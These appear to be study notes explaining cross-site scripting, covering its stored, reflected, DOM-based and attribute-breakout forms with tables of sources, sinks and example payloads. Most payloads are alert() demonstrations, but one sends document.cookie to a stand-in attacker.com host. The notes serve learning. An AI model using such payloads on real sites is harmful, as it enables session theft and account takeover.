
**XSS (Cross-Site Scripting)** is a type of **web security vulnerability** that allows an attacker to **inject malicious scripts (usually JavaScript)** into web pages viewed by other users. These scripts can be used to **steal cookies, session tokens, credentials**, or perform actions as the victim user.

A website accepts user input (e.g., a comment box) and reflects it in the HTML output without proper sanitization or escaping.

<script>alert('XSS')</script>


## What are the types of XSS attacks?

There are three main types of XSS attacks. These are:

- [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting#reflected-cross-site-scripting), where the malicious script comes from the current HTTP request.
- [Stored XSS](https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting), where the malicious script comes from the website's database.
- [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting#dom-based-cross-site-scripting), where the vulnerability exists in client-side code rather than server-side code.

## 1. Stored XSS (Persistent XSS)

**Stored XSS** is the most dangerous type because the malicious payload is permanently saved on the target server (e.g., in a database, comment section, user profile, or log file). It is delivered to every user who accesses the compromised content.

### Detailed Explanation

1. **Injection:** An attacker submits a malicious script to a web application (e.g., a comment field).
    
2. **Storage:** The server accepts and saves the script in its data store (e.g., a SQL database).
    
3. **Execution:** When any legitimate user visits the page that displays this stored data, the server retrieves the malicious script and includes it in the HTML response. The user's browser executes the script, as it trusts the page content coming from the server.
    

### Example Payload

This payload attempts to steal the victim's session cookie and send it to an attacker-controlled server.

|Payload|Explanation|
|---|---|
|`<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>`|The JavaScript uses `fetch` to send a GET request to the attacker's server (`attacker.com/steal`), appending the victim's **`document.cookie`** (the session token) as a URL parameter.|
|`<img src=x onerror=alert('XSS')>`|A common trick: an `<img>` tag is used with a fake source (`src=x`). Since the source fails to load, the **`onerror`** event is triggered, executing the script (here, an `alert` for proof-of-concept). This payload often bypasses simpler filters.|

Export to Sheets


----------------------------------------------------------------------------------------------------------------------------------------------------

## 2. Reflected XSS (Non-Persistent XSS)

**Reflected XSS** occurs when a malicious script is "reflected" off a web application and immediately executed in the user's browser. The payload is typically delivered via a **single HTTP request**, usually in a URL parameter.

### Detailed Explanation

1. **Injection:** The attacker crafts a malicious URL containing the payload (e.g., in a search parameter) and sends this link to a victim (via email, chat, or social media).
    
2. **Reflection:** The victim clicks the link. The web server receives the request and includes the unsanitized payload from the URL parameter directly into the response page (e.g., "Your search for _[payload]_ returned no results").
    
3. **Execution:** The victim's browser receives the page and executes the reflected script. The payload is not stored anywhere permanently on the server.

----------------------------------------------------------------------------------------------------------------------------------------------------

## 3.DOM-Based XSS
DOM-based XSS is a type of Cross-Site Scripting attack where the injection and execution of the malicious script occur **entirely on the client-side** (in the user's browser), without the server ever processing the payload.

The vulnerability arises from insecure client-side code (usually JavaScript) that reads data from a user-controllable source and then writes that data to a sensitive "sink" in the Document Object Model (DOM).

## The Mechanism of DOM-Based XSS

DOM-based XSS involves two key elements within the client-side JavaScript code: a **Source** and a **Sink**.

### i. The Source (The Input)

The **Source** is any object that an attacker can control and inject data into. This is where the malicious payload is introduced. Common sources include:

|Source Object|Description|Attacker Control Example|
|---|---|---|
|**`document.URL`**|The entire URL of the page.|Payload in the URL path or query string.|
|**`document.location.hash`**|The URL fragment (the part after the `#`).|`...page.html#<script>alert(1)</script>`|
|**`document.referrer`**|The previous page the user visited.|Payload embedded in the referrer URL.|
|**`localStorage` / `sessionStorage`**|Data stored locally in the browser.|Payload planted via a previous attack step.|

Export to Sheets

### ii. The Sink (The Output)

The **Sink** is any method or property that can dynamically execute JavaScript or render HTML on the page. When the unsafe data from the Source is written to the Sink, the attack is executed. Common sinks include:

|Sink Method/Property|Description|Danger|
|---|---|---|
|**`element.innerHTML`**|Writes a string of HTML into an element.|The browser parses the HTML and executes any embedded `<script>` tags.|
|**`document.write()` / `document.writeln()`**|Writes content directly to the HTML document stream.|Writes the attacker's script directly into the page's structure.|
|**`element.setAttribute()`**|Sets an attribute like `href` or `src` with a malicious script (e.g., `javascript:alert(1)`).|Can be abused to trigger events like `onload` or `onerror`.|
|**`eval()`**|Executes a string as JavaScript code.|Directly executes the attacker's injected string.|

https://youtu.be/m-0p2BFAZvI?si=S2e4PFCrzbmRZzmJ

---

## The DOM-Based XSS Execution Flow

1. **Attacker Crafts URL:** The attacker places a malicious script in a user-controllable part of the URL (e.g., the URL fragment `#`).
    
    - _Example URL:_ `https://example.com/page.html#user=<img src=x onerror=alert(1)>`
        
2. **Victim Clicks Link:** The victim's browser sends a request for `page.html`. **The URL fragment (`#...`) is never sent to the server.**
    
3. **Client-Side Script Runs:** The server sends back the legitimate `page.html` with its JavaScript code. This script runs automatically.
    
4. **Vulnerable Code Executes:** The application's JavaScript contains a vulnerability, perhaps intended to personalize the page:

--------------------------------------------------------------------------

-  Reflective Cross Site Scripting
- 3 Stored Cross Site Scripting
- 2 DOM-Based Cross Site Scripting
- 1 CSP-Bypass Cross Site Scripting
- 1 use of XSS to leak "something"

--------------------------------------------------------------------------

## XSS in HTML Tag Attributes Explained

When a web application takes user input and places it directly into the value of an HTML attribute, that location is called the **HTML tag attribute context**. The two examples show how an attacker attempts to "break out" of that limited space to execute code.

### 1. Technique 1: Closing the Tag and Inserting a New One

This technique is used when the attacker's input is placed inside an attribute value, and the web application **does not filter** the angle brackets (`<` and `>`).

| Payload Part         | Decoded Markup Example                                      | Explanation                                                               |
| -------------------- | ----------------------------------------------------------- | ------------------------------------------------------------------------- |
| **Original Context** | `<input value="USER_INPUT_HERE">`                           | The attacker's input is meant to stay inside the quotes.                  |
| **Payload**          | `"><script>alert(document.domain)</script>`                 |                                                                           |
| **Resulting HTML**   | `<input value=""><script>alert(document.domain)</script>">` | The attacker uses:                                                        |
|                      |                                                             | 1. **`"`:** To terminate (close) the `value` attribute.                   |
|                      |                                                             | 2. **`>`:** To terminate (close) the `<input>` tag itself.                |
|                      |                                                             | 3. **`<script>...</script>`:** To inject an entirely new, executable tag. |

### 2. Technique 2: Injecting a New Attribute (Event Handler)

This technique is used when the angle brackets (`<` and `>`) are blocked or encoded, preventing the attacker from closing the original tag and starting a new one. The attacker must confine their payload _within_ the original HTML tag.

| Payload Part         | Decoded Markup Example                                           | Explanation                                                                                                                                                                             |
| -------------------- | ---------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Original Context** | `<input value="USER_INPUT_HERE">`                                | The attacker's input is inside the quotes.                                                                                                                                              |
| **Payload**          | `" autofocus onfocus=alert(document.domain) x="`                 |                                                                                                                                                                                         |
| **Resulting HTML**   | `<input value="" autofocus onfocus=alert(document.domain) x="">` | The attacker uses:                                                                                                                                                                      |
|                      |                                                                  | 1. **`"`:** To terminate the original `value` attribute.                                                                                                                                |
|                      |                                                                  | 2. **`autofocus`:** An attribute that automatically gives the element focus when the page loads, attempting to trigger the event handler.                                               |
|                      |                                                                  | 3. **`onfocus=alert(...)`:** **The malicious attribute.** This is a JavaScript **event handler** that executes the `alert` function the moment the element receives focus.              |
|                      |                                                                  | 4. **`x="`:** A "repair" attribute. This is added to gracefully re-open a quote and prevent syntax errors with any remaining, legitimate HTML markup that follows the injected payload. |



